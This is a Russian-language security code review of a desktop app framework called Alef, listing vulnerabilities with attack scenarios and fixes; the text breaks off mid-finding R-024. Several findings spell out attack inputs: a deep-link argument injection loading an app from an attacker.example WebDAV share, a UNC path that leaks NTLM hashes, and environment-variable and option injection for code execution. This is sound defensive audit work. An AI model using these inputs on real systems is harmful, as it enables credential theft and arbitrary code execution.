# Ревью фреймворка Alef (M0–M5.1)

- **Дата:** 2026-10-09
- **Коммит:** `690fb67` (голова `alef-m1`, ветка ревью `review-fx`)
- **Что просмотрено:** `backend/crates/{alef-core, alef-modules, alef-runtime, alef}`, `packages/api`, `packages/mcp`, `tests/e2e`, `scripts`, `docs/` (план, стадии, чекпойнты), `.github/workflows/ci.yml`, `backend/Cargo.toml`. Меню (muda) — отдельный worktree, только чтение, короткий раздел.
- **Чего НЕ просмотрено:** содержимое `backend/patches/*` (только список файлов, `Cargo.toml` и наличие описи изменений), `frontend/` (File Manager как приложение), `experiments/`; в `alef-runtime` — `spikes/integration` (за cargo-feature), `window/state/resize_wait.rs`, `window/input/frame.rs`; в `packages/api` — модули `net/*`, `data/{sqlite,crypto,store,secrets}`, `desktop/{app,window,shell}` (кроме упомянутых мест); в `packages/mcp` — клиентская сторона (`client`, `http-client`, `runtime`, `body`, `types`); страницы сценариев `tests/e2e/apps/**` — выборочно. Поведение на Linux/macOS — только по коду и по CI-конфигу.
- **Как проверял:** чтение кода и тестов, `rg`/`grep`, `git log --stat`, `git blame`, `node scripts/check-structure.mjs`. Ничего не собиралось и не запускалось (общий каталог сборки занят). Каждая находка помечена уверенностью: *подтверждено чтением* / *правдоподобно* / *нужна проверка запуском*.
- **Ограничения:** ревью одного человека за ограниченное время; объём — ~75 тыс. строк без патчей. Приоритет — безопасность и корректность; стиль и мелочи — только там, где они влияют на поведение.

## Ход ревью

Отметки: `[x]` просмотрено, `[~]` в работе, `[ ]` не начато.

### Слои и модули
- [x] docs: FRAMEWORK-PLAN, APP-RUNTIME, TRANSPORT, stages m1/m2b, чекпойнты 10-08/10-09
- [x] alef-core/security: scope (path, net, exec, command, sidecar), permissions, grants, consent, csp, manifest
- [x] alef-core/security: window
- [x] alef-core/protocol: transport (auth, call, stream, http), credit, call, frame
- [x] alef-core/session: resources, streams, session
- [x] alef-core/registry: command, context, dispatch, host, window (mod, geometry, shortcut), dialog; window/tests — бегло
- [x] alef-runtime: bridge (mod, transport, windows, events, e2e, commands), headless, store, ui (mod, integration/shortcut, forward), window (mod, app, delegate, host/*, state/mod, state/restore до тестов, platform/*, input/wheel), spikes/origin; spikes/integration (за feature) и state/resize_wait, input/frame — не читал
- [x] alef: main, lib, args, plan, consent/mod, consent/ask, consent_window, permissions, assets/consent (index.html, consent.js, consent-e2e.js)
- [x] alef-modules/desktop: app (mod, args, autostart, deeplink, instance, console, integration/*), shell/mod, shell/dialog, ui (window, shortcut)
- [x] alef-modules/system: cli (exec, spawn, pty, declared, tree, native), clipboard, notification, os, path, screen
- [x] alef-modules/data: fs (mod, ops, handle, watch, space, dto, fault), store, sqlite (mod, worker, values), crypto, secrets
- [x] alef-modules/net: http (client, mod, spec, body, server/mod, guard, files, upgrade), socket (mod, tcp, tls, udp), websocket, headers
- [x] packages/api: core (transport, stream, events, handshake, errors, web-stream), desktop/shortcut, desktop/dialog, index; system/cli и data/fs — бегло (env, temp, watch); прочие модули (net/*, data/sqlite, crypto, app, window) — не читал
- [x] packages/mcp: core, server, transports/http-server, transports/stdio, schema; client, http-client, runtime, body, types — не читал
- [x] tests/e2e: run.mjs, lib.mjs, harness.js, scenarios/app/app-integration (начало), scenarios/consent (структура); страницы сценариев — выборочно (permissions, window — по grep)
- [x] CI (`.github/workflows/ci.yml`), зависимости (пины `=` во всех крейтах, MSRV), патчи (список, опись изменений)
- [x] Меню (worktree m5-mn, только чтение): `alef-core/.../window/menu.rs` (до тестов), `alef-modules/.../ui/menu.rs`, `alef-runtime/.../integration/menu/mod.rs`, `model.rs`/`native.rs` — выборочно (target, chosen, popup), `packages/api/src/desktop/menu.ts`

### Измерения
- [x] 1. Безопасность
- [x] 2. Корректность и конкурентность
- [x] 3. Соответствие плану и документации
- [x] 4. Качество тестов
- [x] 5. Архитектура и поддерживаемость (`check-structure` — OK)
- [x] 6. Кроссплатформенность (только по коду и CI)
- [x] 7. Зависимости и сборка

## Краткое резюме

27 находок: критичных нет, серьёзных 5, средних 14, мелких 8.

- **alef-core** — сильная сторона проекта: канонизация путей, разбор URL-scope, транспорт (единый 403, привязка сессии к документу, отмена по обрыву), модель согласия с серверной проверкой. Слабые места: таблицы сессии не уплотняются (R-001, R-002), «рискованность» права определяется по тексту шаблона (R-024), значения `{param}` объявленных команд не ограничены (R-012).
- **alef-modules** — проверка входа аккуратная, слабее граница с ОС: `env` от страницы в объявленных командах (R-010), `cmd.exe` и поиск в cwd (R-011), реестр и deep links (R-015, R-023), именованный канал без DACL (R-016), неполный denylist `openPath` (R-017), UNC в `defaultPath` диалогов (R-019).
- **alef-runtime** — владение окнами, ярлыками и сбросом файлов привязано к (окно, сессия) правильно; но тестовые команды e2e и спайк origin вшиты в обычный бинарник и включаются переменной окружения (R-018), а ошибка одного окна закрывает всё приложение (R-022).
- **alef (лаунчер, согласие)** — согласие в отдельном процессе с проверкой ответа сервером — хорошо; разбор командной строки принимает флаги рантайма после URL, и вместе с командой deep link без `--` это инъекция аргументов (R-023).
- **packages/api, packages/mcp** — чисто и осторожно (токен скрыт, лимиты, loopback-only MCP); подмена выдаёт себя формой ответа (R-020, R-007, R-013).
- **Тесты** — их много, они проходили мутационную проверку, но e2e в CI идёт только на Linux и с притворными бэкендами, а часть тестов закрепляет ошибочное поведение (R-025, R-026).
- **CI и зависимости** — точные пины и `--locked` хорошо; нет аудита зависимостей, действия и toolchain плавающие, патчи winit/servo-paint без описи (R-027).

Главные риски: R-023 (запуск чужого приложения со всеми правами из ссылки), R-010 (обход «фиксированной команды» через окружение), R-018 (обход прав при `ALEF_E2E=1`), R-024 (обход подтверждения рискованных прав), R-019 (утечка NTLM без прав); для долгоживущих приложений — R-001/R-002/R-005.

## Находки

Формат: id, заголовок, файл:строка, что не так, как убедился, сценарий, исправление, уверенность.

### Критично

Нет.

### Серьёзно

#### R-001. `StreamHub` никогда не удаляет записи потоков: рост памяти и O(n) на каждый `ack`/`close` за время жизни сессии
- **Файл:** `backend/crates/alef-core/src/session/streams/mod.rs:68-77, 104-124, 226-256`
- **Что не так:** `State.entries: Vec<Entry>` только растёт: `open_outgoing`/`open_incoming*` делают `h.entries.push(...)`, а `close`, `terminate`, `reader()` лишь переводят запись в терминальное состояние; ни одного `retain`/`remove`/`swap_remove` в модуле нет. Каждый `ack`, `close`, `reader`, `incoming_writer` — линейный поиск по всему `Vec`.
- **Как убедился:** чтение модуля целиком; `grep -n "retain\|remove" session/streams/mod.rs` — пусто. Каждый `fs.readFile`-поток, каждый запрос `http.serve` (`answer_request` → `open_outgoing` на тело запроса), каждое сообщение WebSocket как поток, каждое событие `fs.watch` держат по `Arc<Outgoing>` (две `Mutex<Option<..>>`, `CreditGate` c `Notify`) до закрытия сессии.
- **Сценарий:** режим службы/консоли (`APP-RUNTIME.md` §2: «долгоживущие серверы») или окно, живущее днями: `http.serve`, обслуживший N запросов, держит N записей; `runtime.stream.ack` на каждый чанк — O(N). Память и латентность деградируют монотонно без перезагрузки документа. Локальный клиент сервера может ускорить это, просто посылая запросы.
- **Исправление:** удалять запись из `entries` при терминации, когда и reader, и writer отпущены (счётчик ссылок/флаг `done` + `swap_remove`), либо держать `HashMap<StreamId, Entry>` и чистить в `terminate`. Тест: после 10 000 открытых и закрытых потоков `entries.len()` ограничен.
- **Уверенность:** подтверждено чтением.

#### R-002. `ResourceTable` не уплотняет слоты: та же утечка для ресурсов (файлы, сокеты, запросы `http.serve`)
- **Файл:** `backend/crates/alef-core/src/session/resources.rs:17-21, 46-67, 97-110`
- **Что не так:** `slots: Vec<(ResourceId, Option<Box<dyn Resource>>)>`; `take`/`remove` делают `value.take()`, оставляя `(id, None)` навсегда; `insert` всегда `push`. `len()`/лимит считают только живые, но `Vec` и линейные поиски (`with`, `take`) растут с каждым открытым-закрытым ресурсом.
- **Как убедился:** чтение; тест `taken_resource_is_not_closed_and_ids_are_never_reused` фиксирует именно это поведение (id не переиспользуются — верно, но слот не обязан оставаться).
- **Сценарий:** `http.serve`: на каждый запрос `insert(Exchange)` + `Forget::drop → take()` (`net/http/server/mod.rs:209-221`). После миллиона запросов — миллион пустых слотов и O(10^6) на каждый `with_as`.
- **Исправление:** `swap_remove`/`retain` в `take`, id-монотонность хранить отдельно (`next_id` уже есть).
- **Уверенность:** подтверждено чтением.

#### R-010. Объявленные команды (`cli.run`/`cli.start`) принимают `env` от страницы: инъекция через переменные окружения обесценивает «фиксированную команду»
- **Файл:** `backend/crates/alef-modules/src/system/cli/declared/commands.rs:25-35, 64-89`; `backend/crates/alef-modules/src/system/cli/spawn.rs:75-113`
- **Что не так:** модель M4.5c обещает (`FRAMEWORK-PLAN.md` §6.4, `m4-net-cli.md`): «страница выбирает команду по имени и заполняет параметры; программу и аргументы задаёт манифест». Но `RunArgs`/`StartArgs` содержат `env: Option<Vec<(String,String)>>`, а `check_env(env, false)` отбрасывает только `PATH`, `PATHEXT`, `COMSPEC`, `LD_*`, `DYLD_*`. Любая программа, читающая окружение, исполняет чужой код: `git` — `GIT_CONFIG_GLOBAL`/`GIT_CONFIG_COUNT`+`GIT_CONFIG_KEY_0=core.fsmonitor`/`GIT_SSH_COMMAND`/`GIT_EXEC_PATH`; `node` — `NODE_OPTIONS=--require …`; `python` — `PYTHONPATH` (sitecustomize); `perl` — `PERL5OPT`; `ruby` — `RUBYOPT`; `java` — `JAVA_TOOL_OPTIONS`; PowerShell — `PSModulePath`. Пользователь в окне согласия видит «status — … (git status --short {path})» и не может предвидеть этого.
- **Как убедился:** `plan()` передаёт `env` в `exec::run`/`spawn_command` без иного фильтра; `refused_env` — явный короткий список.
- **Сценарий:** приложение с единственным правом `cli.command:status` (`git status --short {path}`) пишет файл конфигурации в свой `$APPDATA` (`fs.write`) с `core.fsmonitor = <команда>` и вызывает `cli.run({name:"status", env:[["GIT_CONFIG_GLOBAL", path]]})` → произвольный код с правами пользователя. Та же схема для `cli.exec` с одной разрешённой программой (без `*`), где документация утверждает, что переменные поиска «нужны `*`», создавая ложное ощущение границы.
- **Исправление:** объявленные команды — без `env` от страницы вовсе (или только переменные, перечисленные в манифесте у команды: `env: [NAME]`); для `cli.exec` без `*` — честно записать, что окружение не является границей, либо перейти на allowlist. Тест: `cli.run` с `env` → `INVALID_ARGUMENT`.
- **Уверенность:** подтверждено чтением (векторы через env — известное поведение перечисленных программ).

#### R-018. Тестовые команды и подмены e2e вшиты в обычный бинарник и включаются переменной окружения `ALEF_E2E=1`: чтение всего диска без прав, создание файлов где угодно, согласие и диалоги «из скрипта»
- **Файл:** `backend/crates/alef-runtime/src/bridge/e2e.rs:15-17, 113-139`; `backend/crates/alef-runtime/src/bridge/mod.rs:219`; `backend/crates/alef-runtime/src/window/host/drops.rs:18-32`; `backend/crates/alef/src/consent/mod.rs:149-176`; `backend/crates/alef-runtime/src/window/host/dialogs.rs:42-56`; `backend/crates/alef-modules/src/lib.rs:83-94`
- **Что не так:** команды `e2e.*` регистрируются в каждом сборочном варианте, условие — только `std::env::var("ALEF_E2E") == "1"` в момент старта (не cargo-feature, как у `spike-integration` в `alef-runtime/Cargo.toml:38-39`). При этой переменной любая страница приложения получает:
  - `e2e.dropFiles({paths})` → `ui.simulate_drop` → `drops::granted` → `grants.grant_read(&path)` для любого существующего пути (каталог — со всем поддеревом): `paths: ["C:\\"]` или `["/"]` — чтение всего диска через обычный `fs.*`, без права в манифесте и без окна согласия;
  - `e2e.once({path})` — `OpenOptions::new().write(true).create_new(true).open(&once.path)` без проверки прав (создание пустого файла где угодно, например маркера в чужом каталоге автозапуска);
  - `e2e.flood({total, piece})` — `vec![7u8; args.piece]` без предела: `piece = 2^40` — abort процесса;
  - согласие: `Asker::from_environment` берёт ответы из `ALEF_E2E_CONSENT`/`ALEF_E2E_CONSENT_UI`; диалоги отвечают из `ALEF_E2E_DIALOGS` (любой путь → грант); модули переходят на «притворные» бэкенды.
  Плюс `ALEF_SPIKE_ORIGIN=1` (`spikes/origin.rs:28-50`, вызывается из `bridge/mod.rs:193-205`, `window/delegate.rs:71`, `headless.rs:66`): точка входа становится `https://spike-app.alef/` со спайковой CSP (`connect-src … https://example.com`), включается IndexedDB, каждый запрос пишется в stderr.
- **Как убедился:** чтение `e2e::register` (ранний `return Ok(())` только по `enabled()`), `drops::granted` (единственный фильтр — `metadata(&path).ok()?`), `Asker::from_environment`.
- **Сценарий:** переменные окружения наследуются: разработчик, однажды выставивший `ALEF_E2E=1` в профиле/терминале (раннер e2e делает это для своих процессов), запускает из того же окружения стороннее приложение — оно молча читает весь диск. Цепочка с R-010: страница передаёт `env` объявленной команде; если эта команда запускает другое Alef-приложение (лаунчер), дочерний процесс получает `ALEF_E2E=1` + `ALEF_E2E_CONSENT=…` и стартует со всеми правами «разрешено» без окна.
- **Исправление:** вынести `bridge/e2e.rs`, сценарии согласия/диалогов и притворные бэкенды за cargo-feature `e2e`, которую включает только раннер (`scripts`/CI), а релизная сборка — нет; `spikes::origin` — за `spike-origin`. Минимум до этого: e2e-режим требует ещё и флаг командной строки и печатает предупреждение. Тест: релизный профиль не содержит строки `e2e.dropFiles` (`strings`/`cargo tree -e features`).
- **Уверенность:** подтверждено чтением; эксплуатация требует контроля окружения процесса (наследование/лаунчер) — правдоподобно.

#### R-023. Deep link на Windows: команда регистрируется как `"alef" "--app" "<папка>" "%1"` без `--`, а разбор командной строки рантайма принимает `--grant`/`--app` и после URL — инъекция аргументов из ссылки
- **Файл:** `backend/crates/alef-modules/src/desktop/app/integration/registry.rs:149-151`; `backend/crates/alef-modules/src/desktop/app/integration/mod.rs:75-80`; `backend/crates/alef/src/args.rs:170-200`
- **Что не так:** `deep_link_command` = `windows_command() + " \"%1\""`, где `windows_command` — три аргумента `exe`, `--app`, `folder`. `parse_args` разбирает весь хвост: `--app` (последнее значение побеждает), `--grant <decision>`, `--dev-url`, `--no-prompt`; URL-аргументы просто складывает в `app_args`, не прекращая разбор. Если `%1` содержит `"`, строка выходит за кавычки и следующие слова становятся флагами рантайма.
- **Как убедился:** чтение `deep_link_command`, `Launch::arguments` и цикла `while let Some(argument)` в `parse_args` (ветка `Some(text) if … Url::parse(text).is_ok()` → `app_args.push`, затем разбор продолжается).
- **Сценарий:** программа, запускающая ссылки через `ShellExecute` без процент-кодирования кавычек (почтовый клиент, мессенджер, PDF-просмотрщик, `start` из `cmd`), открывает `myapp:x" --grant allow --app "\\attacker.example@SSL\share\app` → `argv = [alef, --app, <папка>, myapp:x, --grant, allow, --app, \\attacker…\app]` → запускается приложение с WebDAV-ресурса атакующего со всеми правами «разрешено» без окна согласия. Это класс уязвимостей Electron CVE-2018-1000006.
- **Исправление:** регистрировать `"alef" "--app" "<папка>" "--" "%1"` (`extract_deep_links` уже понимает URL после `--`); в рантайме отвергать повтор `--app` и любые флаги рантайма после первого URL; дополнительно — `--grant` не действует, если в командной строке есть deep link. Тест: строка регистрации заканчивается на `"--" "%1"`; `parse_args([--app, a, "x:y", --grant, allow])` → ошибка.
- **Уверенность:** подтверждено чтением; эксплуатация зависит от программы, открывающей ссылку (браузеры кодируют `"` как `%22`) — правдоподобно, не проверялось запуском. На Linux (`Exec=… %u`) и macOS (Apple Events) инъекции нет.

### Средне

#### R-011. `cli.exec` с `shell: true` на Windows: первое слово проверяется по scope, но `cmd.exe` ищет программу сначала в текущем каталоге
- **Файл:** `backend/crates/alef-modules/src/system/cli/mod.rs:189-242`; `backend/crates/alef-modules/src/system/cli/exec.rs:78-91`
- **Что не так:** без оболочки программа ищется `tree::resolve` по `PATH` рантайма (cwd не участвует — проверено тестом `an_empty_entry_of_the_path_is_not_the_working_folder`). С оболочкой строка целиком уходит в `cmd.exe /C <line>`; `cmd.exe` разрешает первое слово по своим правилам: сначала текущий каталог (`cwd` из аргументов, проверенный лишь правом `fs.read`), затем `PATH` с `PATHEXT`. Scope `cli.exec: [git, cmd.exe]` + право `fs.write` на каталог, который приложение затем передаёт как `cwd`, = запуск произвольного `git.bat`/`git.exe`, положенного туда приложением.
- **Как убедился:** `cwd_of` проверяет только `FsRead`; в ветке `Some(shell)` программа — `shell.command(line)`, первое слово в `cmd.exe` не резолвится рантаймом.
- **Исправление:** для `shell: true` резолвить первое слово самим `tree::resolve` и подставлять в строку абсолютный путь (в кавычках), либо требовать `*` для любого `shell`; на Unix `sh -c` cwd не ищет — проблема только Windows.
- **Уверенность:** подтверждено чтением (поведение `cmd.exe` — документированное).

#### R-012. Значения `{param}` объявленных команд не ограничены: подстановка опций (`--upload-pack=…`, `-c …`) превращает «фиксированную команду» в произвольную
- **Файл:** `backend/crates/alef-core/src/security/scope/command.rs:180-203`
- **Что не так:** `expand` проверяет только NUL. Значение `{path}` может начинаться с `-`: `git ls-remote {url}` с `url = "--upload-pack=calc"`, `git log {ref}` с `ref = "--output=…"`, `tar -xf {file}` с `file = "--use-compress-program=…"`. Манифест не может объявить ни паттерн, ни `--`-разделитель.
- **Исправление:** по умолчанию отвергать значения, начинающиеся с `-` (явное `allowDash: true` у параметра или автоматический `--` перед первым параметром, когда программа это понимает); дать `pattern` в объявлении параметра. Записать ограничение в документацию M4.5c.
- **Уверенность:** подтверждено чтением.

#### R-013. Один семафор на 32 вызова делит короткие команды с долгими; подмена (30 с «мёртвой сети») и ожидания (`cli.wait`, `websocket.send` к зависшему пиру, `http.request` без таймаута) блокируют всю сессию, включая `runtime.stream.ack`
- **Файл:** `backend/crates/alef-core/src/protocol/call.rs:72`; `backend/crates/alef-core/src/protocol/transport/call.rs:97-101`; `backend/crates/alef-modules/src/net/http/mod.rs:116-119`; `backend/crates/alef-modules/src/net/websocket/mod.rs:349-353`
- **Что не так:** `try_begin_call` берёт слот на всё время обработчика. `http.request`/`socket.connect`/`cli.*` при `Substitute` спят `HANG = 30 s`; `websocket.send` ждёт `sink.lock().await.send()` без таймаута; `cli.wait` — до завершения процесса. 32 таких вызова → любой следующий, включая `runtime.stream.ack` (без него останавливаются все исходящие потоки) и `window.*`, получает `BUSY`.
- **Сценарий:** приложение запускает 32 параллельных `http.request` к подменённому scope (обычная картина «загрузить ленту») и на 30 с теряет окно и потоки — что, кстати, выдаёт подмену (вопреки §6.4) не таймингом, а ошибками `BUSY` на несвязанных командах.
- **Исправление:** `runtime.*` вне лимита; отдельный бюджет для «ожидающих» команд (или они освобождают слот на время ожидания); таймаут у `websocket.send`.
- **Уверенность:** подтверждено чтением.

#### R-014. Вывод терминала `cli.pty` целиком спулится в незашифрованный временный файл системного каталога
- **Файл:** `backend/crates/alef-modules/src/system/cli/pty/mod.rs:172-174, 184-223`
- **Что не так:** `tempfile::NamedTempFile::new()` — системный temp, кольцо 32 MiB; всё, что терминал выводит (а значит, и содержимое экрана, вывод команд, иногда и секреты), лежит на диске до завершения процесса. На Linux `/tmp` общий (права 0600 от `tempfile` спасают от чтения другими пользователями, но не от резервных копий/антивирусов); ни документация API, ни заметка «Как сделано (M4.5b)» об этом не говорят.
- **Исправление:** буфер в памяти с ограничением и `Overflow`-событием (как у `fs.watch`), либо спул в `$APPCACHE` с явным упоминанием в документации.
- **Уверенность:** подтверждено чтением.

#### R-015. `app.registerDeepLinks` на Windows регистрирует схему в `HKCU\Software\Classes` без проверки существующего системного обработчика: перехват чужих схем (`steam`, `zoommtg`, `ms-*`, `vscode`…)
- **Файл:** `backend/crates/alef-modules/src/desktop/app/integration/registry.rs:156-200`; `backend/crates/alef-core/src/security/manifest.rs:347-394`; `backend/crates/alef-core/src/security/given/consent.rs:75-89`
- **Что не так:** проверка владения (`AlefOwner`) смотрит только на `HKCU\Software\Classes\<scheme>`. Если схема зарегистрирована в `HKLM`/`HKCR` другой программой (обычный случай), ключа в HKCU нет → регистрация проходит и запись пользователя затеняет системную: все `steam://`, `zoommtg://`, `ms-msdt:` и т. п. начинают открывать это приложение. Список зарезервированных схем в манифесте — 12 web-схем, `Right::risk()` не помечает `app.deepLinks` как рискованное, в окне согласия это одна строка «app.deepLinks:steam» без предупреждения.
- **Как убедился:** в `deep_links()` единственный preflight — `Key::at(&format!("Software\\Classes\\{scheme}"), false)` (HKCU); обращений к `HKEY_CLASSES_ROOT`/`HKLM` нет.
- **Сценарий:** приложение с манифестом `deepLinks: [zoommtg]` (пользователь нажал «разрешить», не зная схемы) получает все ссылки на конференции, включая параметры; при `unregister` восстановить системный обработчик не нужно (HKCU-ключ просто удаляется), но на время регистрации перехват полный.
- **Исправление:** перед регистрацией открывать `HKEY_CLASSES_ROOT\<scheme>` (слитое представление) и отказывать, если там есть `URL Protocol` без нашего маркера; помечать `app.deepLinks` как рискованное право (подтверждение); расширить denylist (`ms-*`, `microsoft-edge`, `search-ms`, `vscode`, `steam`… — или allowlist по префиксу id приложения).
- **Уверенность:** подтверждено чтением (поведение слияния HKCU/HKLM в HKCR — документированное).

#### R-016. Single instance на Windows: именованный канал с DACL по умолчанию и предсказуемым именем — другой пользователь той же машины может занять его и получить аргументы/cwd/URL приложения
- **Файл:** `backend/crates/alef-modules/src/desktop/app/instance.rs:1-6, 80-88, 368-427`
- **Что не так:** комментарий модуля обещает «только пользователь, владеющий endpoint, может достучаться». На Unix это обеспечено (каталог 0700, сокет 0600). На Windows `ServerOptions::new().first_pipe_instance(true).reject_remote_clients(true)` — без `security_attributes`/DACL; имя `\\.\pipe\alef-instance-<fnv1a(home|id)>` вычислимо. Другой локальный пользователь (терминальный сервер, общая машина) создаёт канал первым → наш `claim` получает `ERROR_ACCESS_DENIED` → `Claim::Taken` → приложение отправляет `Hello {args, cwd, urls}` чужому процессу и считает себя «второй копией» (обычно завершается).
- **Как убедился:** `platform::claim` в ветке `windows` не задаёт security descriptor; `ERROR_ACCESS_DENIED` трактуется как «занято своим».
- **Исправление:** задавать DACL только для текущего SID (`SECURITY_ATTRIBUTES` с `security_attributes()` у `ServerOptions`) и включать SID пользователя в имя канала; при `Taken` проверять владельца канала (`GetNamedPipeServerProcessId` + сверка SID) до отправки `Hello`.
- **Уверенность:** подтверждено чтением (DACL по умолчанию именованного канала даёт Everyone чтение; для «занять имя первым» права не нужны).

#### R-017. `shell.openPath` «никогда не запускает программ», но denylist расширений Windows неполон: `.py`/`.pyw`, `.ahk`, `.rb`, `.pl`, `.scf`, `.inf`, `.ws`, `.xbap`…
- **Файл:** `backend/crates/alef-modules/src/desktop/shell/mod.rs:166-223, 302-324`
- **Что не так:** `opens_by_running` судит по списку из 28 расширений; на Windows ассоциация «open» для `.py`/`.pyw` (Python Launcher), `.ahk`, `.rb`, `.pl` — запуск интерпретатора. Приложение с `fs.write` в любой свой каталог + `fs.read` на него пишет `x.pyw` и вызывает `shell.openPath` → код с правами пользователя без права `cli`. Документация модуля (`m2-desktop.md`, docstring) утверждает обратное.
- **Исправление:** на Windows спрашивать ассоциацию (`AssocQueryStringW(ASSOCSTR_EXECUTABLE)`) и отказывать, если исполняемый файл ассоциации — интерпретатор/оболочка, либо честно переформулировать гарантию и расширить список (`py`, `pyw`, `pyz`, `ahk`, `rb`, `pl`, `scf`, `inf`, `ws`, `xbap`, `library-ms`, `theme`, `diagcab`, `msu`).
- **Уверенность:** подтверждено чтением списка; зависимость от установленного Python — правдоподобно.

#### R-003. `fs.readStream`/`fs.writeStream`: задача запускается ДО проверки занятости (`put` → `BUSY`), второй вызов портит позицию и оставляет повисшую задачу
- **Файл:** `backend/crates/alef-modules/src/data/fs/handle.rs:349-387, 397-412`
- **Что не так:** `let task = tokio::spawn(async move { ... reading.read(want, position) ... })` выполняется, и только затем `inner.put(Pump::Read(task))?`. Если помпа уже работает, `put` возвращает `BUSY`, но новая задача уже читает тот же `Cursor` и при `position: None` двигает `cursor.offset` (`handle.rs:64-76`), т. е. крадёт куски у первого потока, а сама пишет в исходящий поток, id которого страница никогда не узнает: после 1 MiB кредита она виснет на `acquire` до закрытия сессии. Для `writeStream` — задача ждёт `reader.recv()` на входящем потоке, о котором страница не знает.
- **Как убедился:** порядок строк 353 (`spawn`) → 386 (`put`), и `put` проверяет `!task.is_finished()` только для уже сохранённой помпы.
- **Сценарий:** приложение дважды вызывает `readStream` на одном handle (например, повтор после ошибки UI): первый поток получает пропуски данных без ошибки; тест на «BUSY» проходит, порча данных незаметна.
- **Исправление:** резервировать слот (`put` с заглушкой или `Mutex<Option<Pump>>` занимать до `spawn`), либо проверять занятость до `spawn`; тест: второй `readStream` → `BUSY`, а первый поток отдаёт файл побайтно без пропусков.
- **Уверенность:** подтверждено чтением.

#### R-004. TOCTOU между `canonical()` и `File::open`: задокументировано как обязанность модуля `fs`, но модуль ничего для этого не делает
- **Файл:** `backend/crates/alef-core/src/security/scope/path.rs:42-74`; `backend/crates/alef-modules/src/data/fs/ops.rs:55, 93, 109`; `docs/stages/m1-core.md:163`
- **Что не так:** права проверяются по канонизированному пути (симлинки разрешены на момент проверки), а операции (`File::open`, `OpenOptions::open`, `fs::copy`, `fs::rename`) идут по тому же пути с обычным следованием ссылкам. Документация обещает «открывать без следования ссылкам, где возможно» — ни `O_NOFOLLOW`, ни `openat`-цепочек, ни повторной проверки по открытому дескриптору (`fstat`/`GetFinalPathNameByHandle`) нет.
- **Как убедился:** в `ops.rs` и `handle.rs` используются только `std::fs::{File, OpenOptions}` без platform-специфичных флагов; `grep -rn "NOFOLLOW\|custom_flags\|FILE_FLAG_OPEN_REPARSE_POINT" alef-modules/src/data` — пусто.
- **Сценарий:** другой локальный процесс (или `cli.exec`-дочерний процесс самого приложения с правом только на одну программу) подменяет компонент пути внутри разрешённого scope на симлинк между проверкой и открытием → чтение/запись вне scope. Окно гонки мало, но воспроизводимо под нагрузкой.
- **Исправление:** минимум — после открытия сверять `canonical(path_of(fd))` с авторизованным путём и закрывать при расхождении (Windows: `GetFinalPathNameByHandleW`; Unix: `/proc/self/fd` или `fstat` dev/ino против `stat` проверенного пути); честно записать в документацию, что сделано.
- **Уверенность:** подтверждено чтением (гонка — правдоподобна, не воспроизводилась).

#### R-005. `http.serve`: каждый входящий запрос — ресурс сессии; локальный клиент исчерпывает общий лимит 1024 и блокирует `fs.open`/сокеты приложения
- **Файл:** `backend/crates/alef-modules/src/net/http/server/mod.rs:209-221, 252-297`; `backend/crates/alef-core/src/protocol/call.rs:72`
- **Что не так:** `answer_request` делает `session.resources().insert(Box::new(Exchange{..}))` и держит его до ответа страницы или `answer_time` (60 с по умолчанию). Лимит `max_resources_per_session = 1024` общий с файлами, сокетами, процессами. Числа соединений и одновременных запросов сервер не ограничивает (`accept_loop` — `JoinSet` без предела).
- **Как убедился:** чтение `answer_request` и `Limits::default`.
- **Сценарий:** любой локальный процесс открывает 1024 запроса к loopback-серверу MCP/HTTP приложения и не читает ответ: следующие `fs.open`, `socket.connect`, `cli.spawn` самого приложения получают `BUSY` («resource limit reached»), пока атакующий держит соединения; новые запросы получают 503. Документация (`APP-RUNTIME.md` §7) предупреждает только о вызове инструментов, не об отказе в обслуживании.
- **Исправление:** отдельный, настраиваемый лимит одновременных запросов/соединений на сервер (Semaphore в `accept_loop` и в `answer_request`), не из бюджета ресурсов сессии; ограничить размер очереди на сервер.
- **Уверенность:** подтверждено чтением.

#### R-019. `dialog.open`/`dialog.save` без всяких прав принимают UNC-путь в `defaultPath`: на Windows это исходящее SMB/WebDAV-подключение с NTLM-аутентификацией пользователя к чужому хосту
- **Файл:** `backend/crates/alef-core/src/registry/dialog.rs:170-180`; `backend/crates/alef-runtime/src/window/host/dialogs.rs:195-205, 228-234`
- **Что не так:** `start()` проверяет только длину, управляющие символы и `Path::new(text).is_absolute()`. На Windows `\\host\share\x` и `\\host@SSL\DavWWWRoot\x` — абсолютные (есть префикс UNC и корень), `\\?\UNC\…` тоже. Затем на UI-потоке `start_of()` делает `path.is_dir()` и `set_directory(...)` — оба обращаются к удалённому ресурсу. Команды `dialog.*` не требуют права (`shell/dialog.rs:48-113` — ни одного `.permission(...)`).
- **Как убедился:** чтение `start`, `start_of`, `files_dialog`; тест `a_start_path_must_be_absolute_and_plain` проверяет только относительный путь, пустую строку и NUL.
- **Сценарий:** страница (или XSS в документе приложения) вызывает `dialog.open({defaultPath: "\\\\attacker.example@SSL\\x\\a.txt"})` → Windows сама проходит NTLM-аутентификацию к хосту атакующего (утечка NetNTLMv2-хеша для офлайн-перебора/relay) ещё до того, как пользователь что-то нажал; диалог при этом может даже не показаться (ошибка сети).
- **Исправление:** отвергать в `defaultPath` UNC, `\\?\`, `\\.\` (любой путь, начинающийся с двух разделителей), либо требовать, чтобы `defaultPath` попадал в `fs.read`-scope или гранты сессии; не звать `is_dir()` на непроверенном пути. Тест: `\\\\host\\share` → `INVALID_ARGUMENT`.
- **Уверенность:** подтверждено чтением; поведение Windows (автоматическая NTLM-аутентификация к UNC/WebDAV) — документированное, запуском не проверялось.

#### R-024. «Рискованное» право определяется по тексту шаблона: равносильные записи проходят окно согласия без предупреждения и без подтверждения
- **Файл:** `backend/crates/alef-core/src/security/given/consent.rs:75-115`; `backend/crates/alef-core/src/security/scope/path.rs:123-157`; `backend/crates/alef/assets/consent/consent.js:46, 120-128`
- **Что не так:** `Right::risk()` сравнивает строку scope с фиксированным списком (`**`, `/**`, `$HOME`, `$HOME/*`, `$HOME/**`, `X:/**`; `cli.exec` — только `*`; `net.http` — только хост `*`). Но `PathPattern::parse` принимает `..` до первого `*` (`Component::ParentDir if rest.is_empty() => base.push("..")`) и канонизирует базу. Значит, без предупреждения проходят: `fs.read:$DOCUMENTS/../**`, `$HOME/./**`, `$HOME/x/../**`, `$APPDATA/../../**` (= весь `$HOME` или выше), `$HOME/*/**`, абсолютные `C:/Users/**`, `/home/**`, `/Users/**`; `cli.exec:powershell`, `cmd`, `bash`, `sh`, `python`, `node`, `wscript` — фактически «любая программа». В окне согласия показывается сырой шаблон (`textOf(right)`), а не то, во что он раскрылся.
